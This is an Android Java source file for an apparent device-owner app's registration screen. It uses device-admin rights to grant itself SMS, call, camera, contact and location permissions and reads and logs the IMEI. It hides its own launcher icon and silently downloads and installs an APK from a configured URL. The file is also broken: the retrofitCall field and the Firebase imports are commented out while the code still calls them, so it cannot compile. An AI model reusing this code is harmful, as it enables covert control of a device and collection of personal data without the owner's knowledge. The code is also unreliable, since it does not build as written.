package com.afwsamples.testdpc;

import static com.afwsamples.testdpc.common.PackageInstallationUtils.ACTION_INSTALL_COMPLETE;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.app.admin.DevicePolicyManager;
import android.app.admin.FactoryResetProtectionPolicy;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

//import com.google.android.gms.tasks.OnCompleteListener;
//import com.google.android.gms.tasks.Task;
//import com.google.firebase.messaging.FirebaseMessaging;
//import com.afwsamples.testdpc.api.RetrofitCall;
import com.afwsamples.testdpc.util.CommonUtil;
import com.afwsamples.testdpc.util.Constant;
import com.afwsamples.testdpc.util.SharedPrefs;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class RegistrationActivity extends Activity {
    private String imei;

    private final int All_Permission = 10;
    private final int BATTERY_OPTIMISE_INTENT = 20;
    private final static int SMS_CALL_INTENT_REQUEST_CODE = 30;

    public static final int PERMISSIONS_OVERLAY = 40;
    public static String[] allReqPermissions = new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA
    };

//    private RetrofitCall retrofitCall = null;
    private ProgressDialog pDialog;

    private DevicePolicyManager mDevicePolicyManager;
    private ComponentName mAdminComponentName;
    private CommonUtil commonUtil;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_registration);
        commonUtil = new CommonUtil(getApplicationContext());
        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminComponentName = DeviceAdminReceiver.getComponentName(getApplicationContext());
        if (mDevicePolicyManager.isAdminActive(mAdminComponentName)) {
//            retrofitCall = new RetrofitCall();
            checkFRP(getApplicationContext());
        } else {
            DeviceOwnerError();
        }
    }

    public void checkFRP(Context context) {
        if (!SharedPrefs.isBooleanSet(context, Constant.IsRegister)) {
            try {
                try {
                    if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
                        FactoryResetProtectionPolicy frp = mDevicePolicyManager.getFactoryResetProtectionPolicy(mAdminComponentName);
                        List<String> account = frp.getFactoryResetProtectionAccounts();
                        if (account.size() > 0) {
                            String account_id = account.get(0);
                            if (account_id.equals(Constant.GOOGLE_ACCOUNT_1)) {
                                SharedPrefs.setStringValue(Constant.IT_ADMIN_EMAIL, Constant.GOOGLE_ACCOUNT, context);
                                grantPermission(false);
                            } else {
                                load();
                            }
                        } else {
                            load();
                        }
                    } else {
                        Bundle restrictions = mDevicePolicyManager.getApplicationRestrictions(mAdminComponentName, "com.google.android.gms");
                        String account_id = restrictions.getString("factoryResetProtectionAdmin");
                        Log.e("factory", "factoryResetProtectionAdmin " + account_id);
                        if (account_id.equals(Constant.GOOGLE_ACCOUNT_1)) {
                            SharedPrefs.setStringValue(Constant.IT_ADMIN_EMAIL, Constant.GOOGLE_ACCOUNT, context);
                            grantPermission(false);
                        } else {
                            load();
                        }
                    }
                } catch (Exception e) {
                    load();
                }
            } catch (Exception e) {
                load();
            }
        } else {
            if(!SharedPrefs.isBooleanSet(context, Constant.HIDING)){
                commonUtil.hideOrShowAppIcon(context, true, true);

                commonUtil.hideOrShowAppIconContact(context, false, true);
                SharedPrefs.setABoolean(context, Constant.HIDING, true);
                finish();
            } else {
                startActivity(new Intent(RegistrationActivity.this, ManageAccountAfterRegisterationActivity.class));
                finish();
            }
        }
    }


    private void grantPermission(boolean flag) {
        if (flag) {
            if (!SharedPrefs.isBooleanSet(getApplicationContext(), Constant.IS_AUTO_GRANT)) {
                new GrantPermissionAsync(flag).execute();
            } else {
                loadUpdate(flag);
            }
        } else {
            new GrantPermissionAsync(flag).execute();
        }
    }


    private void loadUpdate(boolean flag) {
        if (flag) {
            if (SharedPrefs.isBooleanSet(getApplicationContext(), Constant.IsUpdate)) {
                checkAllNecessaryPermissions();
            } else {
                new UpdateApp(getApplicationContext()).execute(BuildConfig.APK);
            }
        } else {
            retrofitCall.GetIMEI(RegistrationActivity.this, true, false);
        }
    }

    private void load() {
        checkSMSCallPermissions();
    }

    private void checkSMSCallPermissions() {
        ArrayList<String> requiredPermissionsList = new ArrayList<>();
        for (String permission : allReqPermissions) {
            if (!checkPermission(permission, RegistrationActivity.this)) {
                requiredPermissionsList.add(permission);
            }
        }
        if (requiredPermissionsList.size() > 0) {
            Log.e("SMS", "Permission ASK");
            SharedPrefs.setABoolean(getApplicationContext(), Constant.IS_AUTO_GRANT, false);
            String[] requiredPermissions = requiredPermissionsList.toArray(new String[requiredPermissionsList.size()]);
            ActivityCompat.requestPermissions(RegistrationActivity.this, requiredPermissions, SMS_CALL_INTENT_REQUEST_CODE);
        } else {
            Log.e("SMS", "Permission Granted");
            grantPermission(true);
        }
    }

    private void CompleteRegistration(String token) {
        try {
            pDialog = new ProgressDialog(RegistrationActivity.this);
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.setMessage(getResources().getString(R.string.RegistrationProcessing));
            pDialog.show();

            String saveImei_2 = SharedPrefs.getStringValue(Constant.IMEI_2, getApplicationContext());

            retrofitCall.registration(RegistrationActivity.this, pDialog,
                    getDeviceBrand(),
                    getDeviceModel(),
                    getDeviceManufacturer(),
                    "Android " + getDeviceOS(),
                    imei,
                    saveImei_2,
                    token);
        } catch (Exception e) {
            if (pDialog != null && pDialog.isShowing()) {
                pDialog.dismiss();
            }
        }
    }

    private void checkAllNecessaryPermissions() {
        if ((checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) ||
                (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)) {

            requestPermissions(new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS,
                    Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, All_Permission);

        } else {
            GetIMEI();
            checkDrawOverlayPermission();
        }
    }

    private static boolean checkPermission(String permission, Activity activity) {
        int permissionState = ActivityCompat.checkSelfPermission(activity, permission);
        return permissionState == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case SMS_CALL_INTENT_REQUEST_CODE:
                if (!checkPermissionsGranted(RegistrationActivity.this)) {
                    Log.e("SMS 1", "Permission Not Granted");
                    grantPermission(true);
                } else {
                    Log.e("SMS 1", "Permission Granted");
                    grantPermission(true);
                }
                break;
            case All_Permission:
                if ((checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) ||
                        (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) ||
                        (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)) {
                    finishAffinity();
                } else {
                    GetIMEI();
                }
                break;
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    public static boolean checkPermissionsGranted(Activity activity) {
        for (String permission : allReqPermissions) {
            if (!checkPermission(permission, activity)) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case BATTERY_OPTIMISE_INTENT:
                AskBatteryOptimisePermission();
                break;
            case PERMISSIONS_OVERLAY:
                checkDrawOverlayPermission();
                break;
        }
    }

    private void AskBatteryOptimisePermission() {
        if (!commonUtil.isBatteryOptimizationDisabled(getApplicationContext())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            try {
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, BATTERY_OPTIMISE_INTENT);
            } catch (Exception e) {
                try {
                    Intent intent1 = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    startActivityForResult(intent1, BATTERY_OPTIMISE_INTENT);
                } catch (Exception ex) {
                    loadUI();
                }
            }
        } else {
            loadUI();
        }
    }

    private void loadUI() {
        if (commonUtil.isOnline(getApplicationContext())) {
            String token = SharedPrefs.getStringValue(Constant.FCM_TOKEN, RegistrationActivity.this);
            if (!token.isEmpty()) {
                CompleteRegistration(token);
            } else {
                getFCMToken();
            }
        } else {
            Toast.makeText(RegistrationActivity.this, getResources().getString(R.string.NoInternetConnection), Toast.LENGTH_LONG).show();
        }

    }

    private void GetIMEI() {
        CommonUtil commonUtil = new CommonUtil(getApplicationContext());
        imei = commonUtil.getUniqueIMEIId(RegistrationActivity.this);
        Toast.makeText(getApplicationContext(), imei, Toast.LENGTH_LONG).show();
        Log.e("FCM", SharedPrefs.getStringValue(Constant.FCM_TOKEN, getApplicationContext()));
        Log.e("FCM", imei);
    }

    private String getDeviceBrand() {
        return Build.BRAND;
    }

    private String getDeviceModel() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    private String getDeviceManufacturer() {
        return Build.MANUFACTURER;
    }

    private String getDeviceOS() {
        return Build.VERSION.RELEASE;
    }

    private class GrantPermissionAsync extends AsyncTask<Void, Void, Void> {

        private boolean lock = false;

        public GrantPermissionAsync(boolean lock) {
            this.lock = lock;
        }

        @Override
        protected Void doInBackground(Void... voids) {
            try {
                ComponentName adminComponent = new ComponentName(RegistrationActivity.this, DeviceAdminReceiver.class);
                final DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (devicePolicyManager.isAdminActive(adminComponent)) {
                    CommonUtil commonUtil = new CommonUtil(RegistrationActivity.this);
                    commonUtil.grantPermission(devicePolicyManager, adminComponent);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(RegistrationActivity.this);
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.setMessage(getResources().getString(R.string.GrantPermissionProcessing));
            pDialog.show();
        }

        @Override
        protected void onPostExecute(Void o) {
            super.onPostExecute(o);
            pDialog.dismiss();
            SharedPrefs.setABoolean(getApplicationContext(), Constant.IS_AUTO_GRANT, true);
            loadUpdate(lock);
        }
    }

    private void getFCMToken() {
        pDialog = new ProgressDialog(RegistrationActivity.this);
        pDialog.setIndeterminate(false);
        pDialog.setCancelable(false);
        pDialog.setMessage(getResources().getString(R.string.GeneratingFCMtoken));
        pDialog.show();

        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                if (pDialog != null && pDialog.isShowing()) {
                    pDialog.dismiss();
                }
                if (!task.isSuccessful()) {
                    Log.e("FCM", "Not Generated");
                    FCMError();
                    return;
                }
                if (task.getResult() != null) {
                    String token = task.getResult();
                    Log.e("FCM", "SendFCMToken - " + token);
                    SharedPrefs.setStringValue(Constant.FCM_TOKEN, token, getApplicationContext());
                    CompleteRegistration(token);
                } else {
                    FCMError();
                }
            }
        });
    }

    private void FCMError() {
        AlertDialog.Builder alertBuilder = new AlertDialog.Builder(RegistrationActivity.this);
        alertBuilder.setMessage(getResources().getString(R.string.FCMTokenError))
                .setTitle(getResources().getString(R.string.FCMTokenTitle))
                .setCancelable(false)
                .setPositiveButton(getResources().getString(R.string.Ok), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });
        alertBuilder.show();
    }

    private void DeviceOwnerError() {
        AlertDialog.Builder alertBuilder = new AlertDialog.Builder(RegistrationActivity.this);
        alertBuilder.setMessage(getResources().getString(R.string.FactoryResetDevice))
                .setTitle(getResources().getString(R.string.DeviceOwnerNotSetupProperly))
                .setCancelable(false)
                .setPositiveButton(getResources().getString(R.string.Ok), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                        finish();
                    }
                });
        alertBuilder.show();
    }


    public class UpdateApp extends AsyncTask<String, Void, Void> {

        private Context context;
        private File outputFile = null;

        public UpdateApp(Context context) {
            this.context = context;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(RegistrationActivity.this);
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.setMessage(getResources().getString(R.string.PermissionDownloading));
            pDialog.show();
        }

        @Override
        protected Void doInBackground(String... arg0) {
            try {
                URL url = new URL(arg0[0]);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setDoOutput(true);
                c.connect();

                File file = null;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Log.e("SMS COMMAND SMSRECEIVER", "Android 11");
                    file = new File(String.valueOf(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)));
                } else {
                    Log.e("SMS COMMAND SMSRECEIVER", "Android 10");
                    file = new File(context.getExternalFilesDir(null).getAbsolutePath() + File.separator + Environment.DIRECTORY_DOWNLOADS);
                }
                file.mkdirs();
                outputFile = new File(file, "update.apk");
                if (outputFile.exists()) {
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = c.getInputStream();

                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                }
                fos.close();
                is.close();

                Log.e("SMS COMMAND SMSRECEIVER", "Downloaded");
            } catch (Exception e) {
                Log.e("SMS COMMAND SMSRECEIVER", "Downloaded error! " + e.getMessage());
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            pDialog.setMessage(getResources().getString(R.string.PermissionInstalling));
            InstallAPK(context, outputFile);
        }
    }


    public void InstallAPK(Context context, File apk_file) {
        try {
            Log.e("SMS COMMAND SMSRECEIVER", "Installing");
            File apkfile = new File(apk_file.getAbsolutePath());
            if (apkfile.exists()) {
                FileInputStream in = new FileInputStream(apkfile);
                PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                params.setAppPackageName(context.getPackageName());
                // set params
                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);
                OutputStream out = session.openWrite("COSU", 0, -1);
                byte[] buffer = new byte[65536];

                int c;
                while ((c = in.read(buffer)) != -1) {
                    out.write(buffer, 0, c);
                }
                session.fsync(out);
                in.close();
                out.close();
                SharedPrefs.setABoolean(context, Constant.IsUpdate, true);
                session.commit(createIntentSender(context, sessionId));
                Handler handler = new Handler();
                Runnable runnable = new Runnable() {
                    @Override
                    public void run() {
                        apk_file.delete();
                        Toast.makeText(context, "Install", Toast.LENGTH_LONG).show();
                    }
                };
                handler.postDelayed(runnable, 5000);
                pDialog.dismiss();
                checkSMSCallPermissions();
            } else {
                Log.e("SMS COMMAND SMSRECEIVER", "File Not Found error! ");
                pDialog.dismiss();
                checkAllNecessaryPermissions();
            }
        } catch (Exception e) {
            Log.e("SMS COMMAND SMSRECEIVER", "Installing error! " + e.getMessage());
            pDialog.dismiss();
            checkAllNecessaryPermissions();
        }
    }


    private IntentSender createIntentSender(Context context, int sessionId) {
        Log.e("SMS COMMAND SMSRECEIVER", "Installed");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context,
                sessionId,
                new Intent(ACTION_INSTALL_COMPLETE),
                0);
        return pendingIntent.getIntentSender();
    }


    private void checkDrawOverlayPermission() {
        if (!SharedPrefs.isBooleanSet(getApplicationContext(), Constant.DRAW_OVER_ENABLE)) {
            if (!Settings.canDrawOverlays(this)) {
                SharedPrefs.setABoolean(getApplicationContext(), Constant.DRAW_OVER_ENABLE, true);
                final Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSIONS_OVERLAY);
            } else {
                AskBatteryOptimisePermission();
            }
        } else {
            AskBatteryOptimisePermission();
        }
    }
}